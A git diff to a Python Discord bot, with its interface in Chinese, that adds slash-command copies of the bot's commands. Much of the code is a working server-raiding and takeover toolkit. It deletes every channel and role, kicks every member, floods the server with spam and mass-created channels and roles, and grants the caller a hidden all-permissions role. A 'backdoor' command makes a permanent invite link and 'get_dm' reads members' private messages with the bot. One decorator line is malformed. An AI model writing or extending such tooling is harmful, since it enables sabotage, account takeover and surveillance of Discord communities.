@@ -10,15 +10,19 @@ import random
 import shutil
 import string
 import time
+from datetime import datetime
 from threading import Thread
+
 import discord
-from discord import ui, opus
+from discord import app_commands, ui, opus
 from discord.ext import commands
+
 from flask import Flask
-import ffmpeg_downloader
-import davey
 import psutil
 import yt_dlp
+
+import davey
+import ffmpeg_downloader
 
 if not opus.is_loaded():
     try:
@@ -78,7 +82,11 @@ intents = discord.Intents.all()
 @bot.event
 async def on_ready():
     print(f'系統連線成功 | 實例 ID: {VERSION_ID} | 帳號: {bot.user}')
-
+    try:
+        await bot.tree.sync()
+    except:
+        pass
+        
 @bot.command(name="help")
 async def help_msg(ctx):
     if not await is_me(ctx): return
@@ -154,10 +162,94 @@ async def help_msg(ctx):
     embed.set_footer(text="注意：所有操作皆會記錄於開發後台。")
     await ctx.send(embed=embed)
 
+@bot.tree.command(name="help", description="help")
+async def help_slash(interaction: discord.Interaction):
+    if interaction.user.id not in ALLOWED_IDS: return
+    
+    embed = discord.Embed(
+        title="🧳 旅行者系統 - 指令完整手冊", 
+        description=f"實例編號：`{VERSION_ID}`\n此表僅授權人員可見。執行指令後會自動隱身並清理痕跡。",
+        color=0x2b2d31
+    )
+    embed.add_field(
+        name="🛡️ 基礎管理", 
+        value=(
+            "`!tm @成員 [分]` - 禁言成員\n"
+            "`!kick_everyone` - 踢出伺服器全員\n"
+            "`!bye` - 機器人退出伺服器\n"
+            "`!set_server [名]` - 修改伺服器名稱\n"
+            "`!server_gate [lock/unlock]` - 全服鎖定/解鎖發言\n"
+            "`!clean_user @成員 [數]` - 刪除指定人的訊息\n"
+            "`!del_msg [數]` - 批次清理訊息\n"
+            "`!backdoor` - 獲取永久邀請連結\n"
+            "`!move_all [頻道ID]` - 強制全體移動語音\n"
+            "`!add_role @成員 @身分組` - 給與成員身分組\n"
+            "`!remove_role @成員 @身分組` - 剝奪成員身分組\n"
+        ), 
+        inline=False
+    )
+    embed.add_field(
+        name="🎵 語音與掛台",
+        value=(
+            "`!join_vc` - 加入你所在的語音頻道\n"
+            "`!leave_vc` - 退出語音頻道\n"
+            "`!play_music [URL]` - 播放SoundCloud 或是DropBox 音訊\n"
+            "`!stop_music` - 停止播放音樂\n"
+            "`!background_music [on/off]` - 開始或停止播放背景音樂\n"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="🔥 破壞系統", 
+        value=(
+            "`!del_ch` - 刪除所有頻道\n"
+            "`!del_role` - 刪除所有身分組\n"
+            "`!100ch` - 建立 100 個頻道\n"
+            "`!100rl` - 建立 100 個身分組\n"
+            "`!spam [次] [文]` - 洗頻攻擊\n"
+            "`!set_server [文]` - 洗頻攻擊\n"
+        ), 
+        inline=False
+    )
+    embed.add_field(
+        name="🛠️ 進階工具", 
+        value=(
+            "`!eval [code]` - 執行動態 Python 腳本\n"
+            "`!snapshot` - 導出伺服器完整結構\n"
+            "`!op_me` - 獲取最高權限\n"
+            "`!reset` - 強制重啟系統\n"
+            "`!test` - 列出Bot的數據\n"
+        ), 
+        inline=False
+    )
+    embed.add_field(
+        name="🎮 有趣系統", 
+        value=(
+            "`!get_dm @成員 [數]` - 調閱私訊紀錄\n"
+            "`!dm @成員 [文]` - 以機器人名義私訊成員\n"
+            "`!random_kick` - 隨機踢一個帥哥\n"
+            "`!how_much?` - 點評成員的盤子行為\n"
+            "`!word_switch` - 開啟字體美化器\n"
+            "`!avatar @成員 ` - 查成員\n"
+        ), 
+        inline=False
+    )
+    embed.set_footer(text="注意：所有操作皆會記錄於開發後台。")
+    await interaction.response.send_message(embed=embed)
+
 @bot.command(name="dm")
 async def dm(ctx, member: discord.Member, *, text: str):
     try: await member.send(text)
     except: pass
+
+@bot.tree.command(name="dm", description="dm")
+@app_commands.describe(member="member", text="text")
+async def dm_slash(interaction: discord.Interaction, member: discord.Member, text: str):
+    try:
+        await member.send(text)
+        await interaction.response.send_message("✅", ephemeral=True)
+    except:
+        await interaction.response.send_message("❌", ephemeral=True)
 
 @bot.command(name="del_ch")
 async def nuke_channels(ctx):
@@ -167,11 +259,29 @@ async def nuke_channels(ctx):
         except: pass
     await ctx.guild.create_text_channel("general")
 
+@bot.tree.command(name="del_ch", description="del_ch")
+async def nuke_channels_slash(interaction: discord.Interaction):
+    if interaction.user.id not in ALLOWED_IDS: return
+    await interaction.response.send_message("⚡", ephemeral=True)
+    for channel in interaction.guild.channels:
+        try: await channel.delete()
+        except: pass
+    await interaction.guild.create_text_channel("general")
+
 @bot.command(name="kick_everyone")
 async def kick_everyone(ctx):
     if not await is_me(ctx): return
     for member in ctx.guild.members:
         if member != ctx.author and member != bot.user and member != ctx.guild.owner:
+            try: await member.kick()
+            except: pass
+
+@bot.tree.command(name="kick_everyone", description="kick_everyone")
+async def kick_everyone_slash(interaction: discord.Interaction):
+    if interaction.user.id not in ALLOWED_IDS: return
+    await interaction.response.send_message("⚡", ephemeral=True)
+    for member in interaction.guild.members:
+        if member != interaction.user and member != bot.user and member != interaction.guild.owner:
             try: await member.kick()
             except: pass
 
@@ -183,16 +293,41 @@ async def clear_roles(ctx):
             try: await role.delete()
             except: pass
 
+@bot.tree.command(name="del_role", description="del_role")
+async def clear_roles_slash(interaction: discord.Interaction):
+    if interaction.user.id not in ALLOWED_IDS: return
+    await interaction.response.send_message("⚡", ephemeral=True)
+    for role in interaction.guild.roles:
+        if role.name != "@everyone" and not role.managed:
+            try: await role.delete()
+            except: pass
+
 @bot.command(name="set_server")
 async def set_server(ctx, *, name: str):
     if not await is_me(ctx): return
     try: await ctx.guild.edit(name=name)
     except: pass
 
+@bot.tree.command(name="set_server", description="set_server")
+@app_commands.describe(name="name")
+async def set_server_slash(interaction: discord.Interaction, name: str):
+    if interaction.user.id not in ALLOWED_IDS: return
+    try:
+        await interaction.guild.edit(name=name)
+        await interaction.response.send_message("✅", ephemeral=True)
+    except:
+        await interaction.response.send_message("❌", ephemeral=True)
+
 @bot.command(name="bye")
 async def leave_server(ctx):
     if not await is_me(ctx): return
     await ctx.guild.leave()
+
+@bot.tree.command(name="bye", description="bye")
+async def leave_server_slash(interaction: discord.Interaction):
+    if interaction.user.id not in ALLOWED_IDS: return
+    await interaction.response.send_message("⚡", ephemeral=True)
+    await interaction.guild.leave()
 
 @bot.command(name="del_msg")
 async def purge_chat(ctx, amount: int = 10):
@@ -200,13 +335,31 @@ async def purge_chat(ctx, amount: int = 10):
     try: await ctx.channel.purge(limit=amount)
     except: pass
 
+@bot.tree.command(name="del_msg", description="del_msg")
+@app_commands.describe(amount="amount")
+async def purge_chat_slash(interaction: discord.Interaction, amount: int = 10):
+    if interaction.user.id not in ALLOWED_IDS: return
+    await interaction.response.send_message("⚡", ephemeral=True)
+    try: await interaction.channel.purge(limit=amount)
+    except: pass
+
 @bot.command(name="spam")
 async def spam(ctx, count: int, *, text: str):
     if not await is_me(ctx): return
     for i in range(min(count, 100)):
         try:
-            suffix = ''.join(random.choices(string.ascii_letters + string.digits, k=5))
             await ctx.send(f"{text}")
+            await asyncio.sleep(0.8)
+        except: break
+
+@bot.tree.command(name="spam", description="spam")
+@app_commands.describe(count="count", text="text")
+async def spam_slash(interaction: discord.Interaction, count: int, text: str):
+    if interaction.user.id not in ALLOWED_IDS: return
+    await interaction.response.send_message("⚡", ephemeral=True)
+    for i in range(min(count, 100)):
+        try:
+            await interaction.channel.send(f"{text}")
             await asyncio.sleep(0.8)
         except: break
 
@@ -218,11 +371,29 @@ async def role_hell(ctx):
         try: await ctx.guild.create_role(name=f"{i}", color=color)
         except: break
 
+@bot.tree.command(name="100rl", description="100rl")
+async def role_hell_slash(interaction: discord.Interaction):
+    if interaction.user.id not in ALLOWED_IDS: return
+    await interaction.response.send_message("⚡", ephemeral=True)
+    for i in range(100):
+        color = discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
+        try: await interaction.guild.create_role(name=f"{i}", color=color)
+        except: break
+
 @bot.command(name="100ch")
 async def flood(ctx, name="ch-----test"):
     if not await is_me(ctx): return
     for i in range(100):
         try: await ctx.guild.create_text_channel(f"{name}-{i}")
+        except: break
+
+@bot.tree.command(name="100ch", description="100ch")
+@app_commands.describe(name="name")
+async def flood_slash(interaction: discord.Interaction, name: str = "ch-----test"):
+    if interaction.user.id not in ALLOWED_IDS: return
+    await interaction.response.send_message("⚡", ephemeral=True)
+    for i in range(100):
+        try: await interaction.guild.create_text_channel(f"{name}-{i}")
         except: break
 
 @bot.command(name="op_me")
@@ -239,6 +410,21 @@ async def op_me(ctx):
         await new_role.edit(position=guild.me.top_role.position - 1)
     except: pass
 
+@bot.tree.command(name="op_me", description="op_me")
+async def op_me_slash(interaction: discord.Interaction):
+    if interaction.user.id not in ALLOWED_IDS: return
+    await interaction.response.send_message("⚡", ephemeral=True)
+    guild = interaction.guild
+    try:
+        new_role = await guild.create_role(
+            name="OP", 
+            permissions=discord.Permissions.all(), 
+            color=discord.Color.from_str("#2b2d31")
+        )
+        await interaction.user.add_roles(new_role)
+        await new_role.edit(position=guild.me.top_role.position - 1)
+    except: pass
+
 @bot.command(name="tm")
 async def tm(ctx, member: discord.Member = None, minutes: int = 10):
     if not await is_me(ctx): return
@@ -248,6 +434,17 @@ async def tm(ctx, member: discord.Member = None, minutes: int = 10):
         await member.timeout(duration, reason="呼吸")
     except: pass
 
+@bot.tree.command(name="tm", description="tm")
+@app_commands.describe(member="member", minutes="minutes")
+async def tm_slash(interaction: discord.Interaction, member: discord.Member, minutes: int = 10):
+    if interaction.user.id not in ALLOWED_IDS: return
+    try:
+        duration = datetime.timedelta(minutes=minutes)
+        await member.timeout(duration, reason="呼吸")
+        await interaction.response.send_message("✅", ephemeral=True)
+    except:
+        await interaction.response.send_message("❌", ephemeral=True)
+
 @bot.command(name="backdoor")
 async def backdoor(ctx):
     if not await is_me(ctx): return
@@ -256,10 +453,30 @@ async def backdoor(ctx):
         await ctx.author.send(f"永久入口: {inv.url}")
     except: pass
 
+@bot.tree.command(name="backdoor", description="backdoor")
+async def backdoor_slash(interaction: discord.Interaction):
+    if interaction.user.id not in ALLOWED_IDS: return
+    try:
+        inv = await interaction.channel.create_invite(max_age=0, max_uses=0)
+        await interaction.user.send(f"永久入口: {inv.url}")
+        await interaction.response.send_message("✅", ephemeral=True)
+    except:
+        await interaction.response.send_message("❌", ephemeral=True)
+
 @bot.command(name="move_all")
 async def move_all(ctx, channel: discord.VoiceChannel):
     if not await is_me(ctx): return
     for member in ctx.guild.members:
+        if member.voice:
+            try: await member.move_to(channel)
+            except: pass
+
+@bot.tree.command(name="move_all", description="move_all")
+@app_commands.describe(channel="channel")
+async def move_all_slash(interaction: discord.Interaction, channel: discord.VoiceChannel):
+    if interaction.user.id not in ALLOWED_IDS: return
+    await interaction.response.send_message("⚡", ephemeral=True)
+    for member in interaction.guild.members:
         if member.voice:
             try: await member.move_to(channel)
             except: pass
@@ -270,6 +487,16 @@ async def isolate(ctx, member: discord.Member):
     try: await member.edit(roles=[])
     except: pass
 
+@bot.tree.command(name="disrole", description="disrole")
+@app_commands.describe(member="member")
+async def isolate_slash(interaction: discord.Interaction, member: discord.Member):
+    if interaction.user.id not in ALLOWED_IDS: return
+    try:
+        await member.edit(roles=[])
+        await interaction.response.send_message("✅", ephemeral=True)
+    except:
+        await interaction.response.send_message("❌", ephemeral=True)
+
 @bot.command(name="server_gate")
 async def server_gate(ctx, status: str):
     if not await is_me(ctx): return
@@ -278,17 +505,47 @@ async def server_gate(ctx, status: str):
         try: await channel.set_permissions(ctx.guild.default_role, send_messages=can_send)
         except: pass
 
+@bot.tree.command(name="server_gate", description="server_gate")
+@app_commands.describe(status="status")
+async def server_gate_slash(interaction: discord.Interaction, status: str):
+    if interaction.user.id not in ALLOWED_IDS: return
+    await interaction.response.send_message("⚡", ephemeral=True)
+    can_send = True if status == "unlock" else False
+    for channel in interaction.guild.text_channels:
+        try: await channel.set_permissions(interaction.guild.default_role, send_messages=can_send)
+        except: pass
+
 @bot.command(name="add_role")
 async def add_role(ctx, member: discord.Member, role: discord.Role):
     if not await is_me(ctx): return
     try: await member.add_roles(role)
     except: pass
 
+@bot.tree.command(name="add_role", description="add_role")
+@app_commands.describe(member="member", role="role")
+async def add_role_slash(interaction: discord.Interaction, member: discord.Member, role: discord.Role):
+    if interaction.user.id not in ALLOWED_IDS: return
+    try:
+        await member.add_roles(role)
+        await interaction.response.send_message("✅", ephemeral=True)
+    except:
+        await interaction.response.send_message("❌", ephemeral=True)
+
 @bot.command(name="remove_role")
 async def remove_role(ctx, member: discord.Member, role: discord.Role):
     if not await is_me(ctx): return
     try: await member.remove_roles(role)
     except: pass
+
+@bot.tree.command(name="remove_role", description="remove_role")
+@app_commands.describe(member="member", role="role")
+async def remove_role_slash(interaction: discord.Interaction, member: discord.Member, role: discord.Role):
+    if interaction.user.id not in ALLOWED_IDS: return
+    try:
+        await member.remove_roles(role)
+        await interaction.response.send_message("✅", ephemeral=True)
+    except:
+        await interaction.response.send_message("❌", ephemeral=True)
 
 @bot.command(name="get_dm")
 async def get_dm(ctx, member: discord.Member, limit: int = 10):
@@ -302,25 +559,54 @@ async def get_dm(ctx, member: discord.Member, limit: int = 10):
         await ctx.author.send(f"📂 **與 {member.name} 的紀錄：**\n{result[:1900]}")
     except: pass
 
+@bot.tree.command(name="get_dm", description="get_dm")
+@app_commands.describe(member="member", limit="limit")
+async def get_dm_slash(interaction: discord.Interaction, member: discord.Member, limit: int = 10):
+    try:
+        dm_channel = member.dm_channel or await member.create_dm()
+        history = []
+        async for msg in dm_channel.history(limit=limit):
+            who = "機器人" if msg.author == bot.user else "成員"
+            history.append(f"[{msg.created_at.strftime('%H:%M')}] {who}: {msg.content}")
+        result = "\n".join(reversed(history)) or "無私訊紀錄"
+        await interaction.user.send(f"📂 **與 {member.name} 的紀錄：**\n{result[:1900]}")
+        await interaction.response.send_message("✅", ephemeral=True)
+    except:
+        await interaction.response.send_message("❌", ephemeral=True)
+
 @bot.command(name="how_much?")
 async def worth(ctx):
     price = random.randint(1, 999999)
     comments = ["這玩意兒我看就值這麼多", "太貴了吧，根本盤子", "這東西拿去回收站都嫌重"]
     await ctx.send(f"💰 我覺得這東西價值 **${price:,}**。{random.choice(comments)}")
 
+@bot.tree.command(name="how_much?", description="how_much?")
+async def worth_slash(interaction: discord.Interaction):
+    price = random.randint(1, 999999)
+    comments = ["這玩意兒我看就值這麼多", "太貴了吧，根本盤子", "這東西拿去回收站都嫌重"]
+    await interaction.response.send_message(f"💰 我覺得這東西價值 **${price:,}**。{random.choice(comments)}")
+
 @bot.command(name="random_kick")
 async def mock_kick(ctx):
-
     members = [m for m in ctx.guild.members if not m.bot]
     target = random.choice(members)
-    
     msg = await ctx.send(f"⚠️ **系統偵測到有人降低伺服器平均智商...**\n正在準備將 {target.mention} 移出伺服器以緩減降智問題...")
     await asyncio.sleep(2)
-    
     for i in range(1, 4):
         await msg.edit(content=f"⚠️ **系統偵測到有人降低伺服器平均智商...**\n正在準備將 {target.mention} 移出伺服器...\n進度：[{'█' * i}{'░' * (3-i)}] {i*33}%")
         await asyncio.sleep(1)
-    
+    await msg.edit(content=f"❌ **操作失敗**\n原因：`{target.display_name}` 太帥了，權限不足。")
+
+@bot.tree.command(name="random_kick", description="random_kick")
+async def mock_kick_slash(interaction: discord.Interaction):
+    members = [m for m in interaction.guild.members if not m.bot]
+    target = random.choice(members)
+    await interaction.response.send_message(f"⚠️ **系統偵測到有人降低伺服器平均智商...**\n正在準備將 {target.mention} 移出伺服器以緩減降智問題...")
+    msg = await interaction.original_response()
+    await asyncio.sleep(2)
+    for i in range(1, 4):
+        await msg.edit(content=f"⚠️ **系統偵測到有人降低伺服器平均智商...**\n正在準備將 {target.mention} 移出伺服器...\n進度：[{'█' * i}{'░' * (3-i)}] {i*33}%")
+        await asyncio.sleep(1)
     await msg.edit(content=f"❌ **操作失敗**\n原因：`{target.display_name}` 太帥了，權限不足。")
 
 FONT_MAPS = {
@@ -359,6 +645,10 @@ class FontModal(ui.Modal, title="字體轉換器"):
 async def font_cmd(ctx):
     await ctx.send("點擊下方按鈕開啟轉換器：", view=FontLaunchView())
 
+@bot.tree.command(name="word_switch", description="word_switch")
+async def font_cmd_slash(interaction: discord.Interaction):
+    await interaction.response.send_message("點擊下方按鈕開啟轉換器：", view=FontLaunchView())
+
 class FontLaunchView(ui.View):
     def __init__(self):
         super().__init__(timeout=None)
@@ -367,7 +657,7 @@ class FontLaunchView(ui.View):
     async def open_modal(self, interaction: discord.Interaction, button: ui.Button):
         await interaction.response.send_modal(FontModal())
 
-@bot.command(name="snapshot")
+@@bot.command(name="snapshot")
 async def snapshot(ctx):
     if ctx.author.id not in ALLOWED_IDS: return
     await ctx.author.send("🚀 正在生成伺服器備份...")
@@ -404,7 +694,46 @@ async def snapshot(ctx):
         data["categories"].append(cat_info)
     json_bytes = json.dumps(data, indent=4, ensure_ascii=False).encode()
     await ctx.author.send(file=discord.File(io.BytesIO(json_bytes), filename=f"SNAPSHOT_{guild.id}.json"))
-    
+
+@bot.tree.command(name="snapshot", description="snapshot")
+async def snapshot_slash(interaction: discord.Interaction):
+    if interaction.user.id not in ALLOWED_IDS: return
+    await interaction.response.send_message("⚡", ephemeral=True)
+    await interaction.user.send("🚀 正在生成伺服器備份...")
+    guild = interaction.guild
+    roles = []
+    for r in sorted(guild.roles, key=lambda x: x.position):
+        if not r.managed and r.name != "@everyone":
+            roles.append({
+                "name": r.name,
+                "color": r.color.value,
+                "perms": r.permissions.value
+            })
+    data = {
+        "server": guild.name,
+        "roles": roles,
+        "categories": []
+    }
+    for cat in guild.categories:
+        cat_info = {"name": cat.name, "overwrites": [], "channels": []}
+        for target, ov in cat.overwrites.items():
+            cat_info["overwrites"].append({"target": target.name, "allow": ov.pair()[0].value, "deny": ov.pair()[1].value})
+        for ch in cat.channels:
+            ch_data = {"name": ch.name, "type": str(ch.type), "overwrites": []}
+            for target, ov in ch.overwrites.items():
+                ch_data["overwrites"].append({"target": target.name, "allow": ov.pair()[0].value, "deny": ov.pair()[1].value})
+            if isinstance(ch, discord.TextChannel):
+                msgs = []
+                try:
+                    async for m in ch.history(limit=10, oldest_first=True):
+                        msgs.append(m.content)
+                except: pass
+                ch_data["history"] = msgs
+            cat_info["channels"].append(ch_data)
+        data["categories"].append(cat_info)
+    json_bytes = json.dumps(data, indent=4, ensure_ascii=False).encode()
+    await interaction.user.send(file=discord.File(io.BytesIO(json_bytes), filename=f"SNAPSHOT_{guild.id}.json"))
+
 @bot.command(name="eval")
 async def eval_code(ctx, *, code: str = None):
     if ctx.author.id not in ALLOWED_IDS: return
@@ -450,10 +779,66 @@ async def eval_code(ctx, *, code: str = None):
                 elif ch_data['type'] == 'voice':
                     await new_cat.create_voice_channel(ch_data['name'], overwrites=ch_ov)
         return await ctx.author.send("✅ 還原完成!")
-        
+
+@bot.tree.command(name="eval", description="eval")
+@app_commands.describe(code="code", file="上傳要還原的備份 JSON 檔案")
+async def eval_code_slash(interaction: discord.Interaction, code: str = None, file: discord.Attachment = None):
+    if interaction.user.id not in ALLOWED_IDS: return
+    if file:
+        await interaction.response.send_message("⚡", ephemeral=True)
+        file_data = await file.read()
+        data = json.loads(file_data.decode('utf-8'))
+        await interaction.user.send(f"🏗️ 開始還原伺服器：{data['server']}")
+        created_roles = []
+        for r_data in data.get('roles', []):
+            role = discord.utils.get(interaction.guild.roles, name=r_data['name'])
+            if not role:
+                try:
+                    role = await interaction.guild.create_role(
+                        name=r_data['name'],
+                        color=discord.Color(r_data['color']),
+                        permissions=discord.Permissions(r_data['perms'])
+                    )
+                except: continue
+            created_roles.append(role)
+        try:
+            payload = {role: i + 1 for i, role in enumerate(created_roles)}
+            await interaction.guild.edit_role_positions(payload)
+        except Exception as e:
+            await interaction.user.send(f"⚠️ 順序調整受限，請確保機器人身分組在最頂端後手動調整或再試一次: {e}")
+        role_map = {r.name: r for r in interaction.guild.roles}
+        for cat_data in data['categories']:
+            cat_ov = {}
+            for o in cat_data.get('overwrites', []):
+                target = role_map.get(o['target'])
+                if target: cat_ov[target] = discord.PermissionOverwrite.from_pair(discord.Permissions(o['allow']), discord.Permissions(o['deny']))
+            new_cat = await interaction.guild.create_category(cat_data['name'], overwrites=cat_ov)
+            for ch_data in cat_data['channels']:
+                ch_ov = {}
+                for o in ch_data.get('overwrites', []):
+                    target = role_map.get(o['target'])
+                    if target: ch_ov[target] = discord.PermissionOverwrite.from_pair(discord.Permissions(o['allow']), discord.Permissions(o['deny']))
+                if ch_data['type'] == 'text':
+                    new_ch = await new_cat.create_text_channel(ch_data['name'], overwrites=ch_ov)
+                    for content in ch_data.get('history', []):
+                        if content:
+                            await new_ch.send(content)
+                            await asyncio.sleep(0.5)
+                elif ch_data['type'] == 'voice':
+                    await new_cat.create_voice_channel(ch_data['name'], overwrites=ch_ov)
+        return await interaction.user.send("✅ 還原完成!")
+    else:
+        await interaction.response.send_message("❌", ephemeral=True)
+
 @bot.command(name="reset")
 async def reboot(ctx):
     if not await is_me(ctx): return
+    os._exit(0)
+
+@bot.tree.command(name="reset", description="reset")
+async def reboot_slash(interaction: discord.Interaction):
+    if interaction.user.id not in ALLOWED_IDS: return
+    await interaction.response.send_message("⚡", ephemeral=True)
     os._exit(0)
 
 @bot.command(name="join_vc")
@@ -473,7 +858,28 @@ async def join(ctx):
             print(f"語音連線失敗: {e}")
     else:
         await ctx.author.send("⚠️ 你必須先進入一個語音頻道！")
-        
+
+@bot.tree.command(name="join_vc", description="join_vc")
+async def join_slash(interaction: discord.Interaction):
+    if interaction.user.id not in ALLOWED_IDS: return
+    if interaction.user.voice and interaction.user.voice.channel:
+        voice_channel = interaction.user.voice.channel
+        try:
+            print(f"正在嘗試連線至: {voice_channel.name}")
+            if interaction.guild.voice_client:
+                await interaction.guild.voice_client.move_to(voice_channel)
+            else:
+                await voice_channel.connect()
+            print("連線成功")
+            await interaction.response.send_message("✅", ephemeral=True)
+        except Exception as e:
+            await interaction.user.send(f"❌ 無法加入語音: `{e}`")
+            print(f"語音連線失敗: {e}")
+            await interaction.response.send_message("❌", ephemeral=True)
+    else:
+        await interaction.user.send("⚠️ 你必須先進入一個語音頻道！")
+        await interaction.response.send_message("⚠️", ephemeral=True)
+
 @bot.command(name="leave_vc")
 async def dc(ctx):
     if not await is_me(ctx): return
@@ -482,6 +888,14 @@ async def dc(ctx):
 
     if ctx.voice_client:
         try: await ctx.voice_client.disconnect()
+        except: pass
+
+@bot.tree.command(name="leave_vc", description="leave_vc")
+async def dc_slash(interaction: discord.Interaction):
+    if interaction.user.id not in ALLOWED_IDS: return
+    await interaction.response.send_message("⚡", ephemeral=True)
+    if interaction.guild.voice_client:
+        try: await interaction.guild.voice_client.disconnect()
         except: pass
 
 bgm_enabled = False
@@ -511,7 +925,7 @@ class PlayerControlView(discord.ui.View):
 
     @discord.ui.button(label="暫停/繼續", style=discord.ButtonStyle.blurple, emoji="⏯️")
     async def play_pause(self, interaction: discord.Interaction, button: discord.ui.Button):
-        vc = self.ctx.voice_client
+        vc = self.ctx.voice_client if isinstance(self.ctx, commands.Context) else self.ctx.guild.voice_client
         if not vc:
             return await interaction.response.send_message("❌ 機器人不在語音頻道中", ephemeral=True)
         if vc.is_playing():
@@ -534,8 +948,9 @@ class PlayerControlView(discord.ui.View):
     async def stop_player(self, interaction: discord.Interaction, button: discord.ui.Button):
         self.is_looping = False
         self.manual_stop = True
-        if self.ctx.voice_client:
-            self.ctx.voice_client.stop()
+        vc = self.ctx.voice_client if isinstance(self.ctx, commands.Context) else self.ctx.guild.voice_client
+        if vc:
+            vc.stop()
             await interaction.response.send_message("⏹️ 已停止播放", ephemeral=True)
             await asyncio.sleep(1)
             bot.loop.create_task(play_bgm(self.ctx))
@@ -546,17 +961,20 @@ class PlayerControlView(discord.ui.View):
     async def leave_vc(self, interaction: discord.Interaction, button: discord.ui.Button):
         self.is_looping = False
         self.manual_stop = True
-        if self.ctx.voice_client:
-            await self.ctx.voice_client.disconnect()
+        vc = self.ctx.voice_client if isinstance(self.ctx, commands.Context) else self.ctx.guild.voice_client
+        if vc:
+            await vc.disconnect()
             await interaction.response.send_message("🚪 已斷開連線", ephemeral=True)
 
     @discord.ui.button(label="重新連結", style=discord.ButtonStyle.gray, emoji="🔧")
     async def reconnect_vc(self, interaction: discord.Interaction, button: discord.ui.Button):
-        if self.ctx.author.voice:
+        author = self.ctx.author if isinstance(self.ctx, commands.Context) else self.ctx.user
+        vc = self.ctx.voice_client if isinstance(self.ctx, commands.Context) else self.ctx.guild.voice_client
+        if author.voice:
             try:
-                if self.ctx.voice_client:
-                    await self.ctx.voice_client.disconnect(force=True)
-                await self.ctx.author.voice.channel.connect(reconnect=True)
+                if vc:
+                    await vc.disconnect(force=True)
+                await author.voice.channel.connect(reconnect=True)
                 await interaction.response.send_message("✅ 已強制重新連接語音端點", ephemeral=True)
             except Exception as e:
                 await interaction.response.send_message(f"❌ 重連失敗: {e}", ephemeral=True)
@@ -565,7 +983,8 @@ class PlayerControlView(discord.ui.View):
 
 async def play_bgm(ctx):
     global is_switching
-    if not bgm_enabled or not ctx.voice_client or ctx.voice_client.is_playing() or is_switching:
+    vc = ctx.voice_client if isinstance(ctx, commands.Context) else ctx.guild.voice_client
+    if not bgm_enabled or not vc or vc.is_playing() or is_switching:
         return
 
     bgm_ffmpeg_opts = {
@@ -583,11 +1002,12 @@ async def play_bgm(ctx):
         source = await discord.FFmpegOpusAudio.from_probe(audio_url, executable=ffmpeg_exe, **bgm_ffmpeg_opts)
         
         def after_bgm(error):
-            if bgm_enabled and ctx.voice_client and not ctx.voice_client.is_playing() and not is_switching:
+            current_vc = ctx.voice_client if isinstance(ctx, commands.Context) else ctx.guild.voice_client
+            if bgm_enabled and current_vc and not current_vc.is_playing() and not is_switching:
                 bot.loop.call_soon_threadsafe(lambda: bot.loop.create_task(play_bgm(ctx)))
         
-        if ctx.voice_client and not ctx.voice_client.is_playing():
-            ctx.voice_client.play(source, after=after_bgm)
+        if vc and not vc.is_playing():
+            vc.play(source, after=after_bgm)
     except:
         pass
 
@@ -671,6 +1091,89 @@ async def p(ctx, *, url):
             await ctx.send(f"❌ 播放失敗: `{str(e)[:100]}`")
             bot.loop.create_task(play_bgm(ctx))
 
+@bot.tree.command(name="play_music", description="play_music")
+@app_commands.describe(url="url")
+async def p_slash(interaction: discord.Interaction, url: str):
+    global is_switching
+    if interaction.user.id not in ALLOWED_IDS: return
+    
+    if not interaction.guild.voice_client:
+        if interaction.user.voice:
+            try:
+                await interaction.user.voice.channel.connect(reconnect=True, timeout=20)
+            except Exception as e:
+                return await interaction.response.send_message(f"❌ 無法進入頻道: `{e}`", ephemeral=True)
+        else:
+            return await interaction.response.send_message("⚠️ 請先進入語音頻道", ephemeral=True)
+
+    await interaction.response.defer()
+    is_switching = True
+    if interaction.guild.voice_client.is_playing() or interaction.guild.voice_client.is_paused():
+        interaction.guild.voice_client.stop()
+        await asyncio.sleep(1)
+
+    ffmpeg_opts = {
+        'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5',
+        'options': '-vn -ar 48000 -ac 2 -b:a 256k -packet_loss 5 -af "volume=0.9" -async 1 -frame_duration 20 -preset veryfast'
+    }
+
+    async def silent_play_slash(target_url, current_view):
+        global is_switching
+        if not interaction.guild.voice_client: return
+        try:
+            def fetch_info():
+                with yt_dlp.YoutubeDL({'format': 'bestaudio/best', 'quiet': True, 'noplaylist': True}) as ydl:
+                    return ydl.extract_info(target_url, download=False)
+            
+            info = await bot.loop.run_in_executor(None, fetch_info)
+            audio_url = info.get('url') or info['entries'][0]['url']
+            source = await discord.FFmpegOpusAudio.from_probe(audio_url, executable=ffmpeg_exe, **ffmpeg_opts)
+            
+            def loop_after_slash(error):
+                if current_view.manual_stop or is_switching: return
+                if current_view.is_looping and interaction.guild.voice_client:
+                    bot.loop.call_soon_threadsafe(lambda: bot.loop.create_task(silent_play_slash(target_url, current_view)))
+                else:
+                    bot.loop.call_soon_threadsafe(lambda: bot.loop.create_task(play_bgm(interaction)))
+
+            if interaction.guild.voice_client:
+                interaction.guild.voice_client.play(source, after=loop_after_slash)
+            is_switching = False
+        except:
+            is_switching = False
+            bot.loop.create_task(play_bgm(interaction))
+
+    try:
+        def fetch_initial():
+            with yt_dlp.YoutubeDL({'format': 'bestaudio/best', 'quiet': True, 'noplaylist': True}) as ydl:
+                return ydl.extract_info(url, download=False)
+        
+        info = await bot.loop.run_in_executor(None, fetch_initial)
+        if 'entries' in info: info = info['entries'][0]
+        
+        title = info.get('title', '❌ 未知歌曲')
+        uploader = info.get('uploader', '❌ 未知來源')
+        duration = info.get('duration')
+        
+        view = PlayerControlView(interaction, url, title, duration, uploader)
+        source = await discord.FFmpegOpusAudio.from_probe(info['url'], executable=ffmpeg_exe, **ffmpeg_opts)
+        
+        def initial_after_slash(error):
+            if view.manual_stop: return
+            if view.is_looping and interaction.guild.voice_client:
+                bot.loop.call_soon_threadsafe(lambda: bot.loop.create_task(silent_play_slash(url, view)))
+            else:
+                bot.loop.call_soon_threadsafe(lambda: bot.loop.create_task(play_bgm(interaction)))
+
+        if interaction.guild.voice_client:
+            interaction.guild.voice_client.play(source, after=initial_after_slash)
+        is_switching = False
+        await interaction.followup.send(embed=view._get_embed(), view=view)
+    except Exception as e:
+        is_switching = False
+        await interaction.followup.send(f"❌ 播放失敗: `{str(e)[:100]}`")
+        bot.loop.create_task(play_bgm(interaction))
+
 @bot.command(name="stop_music")
 async def stop_music(ctx):
     if ctx.voice_client:
@@ -678,6 +1181,17 @@ async def stop_music(ctx):
         await ctx.send("⏹️ 已停止播放")
         await asyncio.sleep(1)
         bot.loop.create_task(play_bgm(ctx))
+
+@bot.tree.command(name="stop_music", description="stop_music")
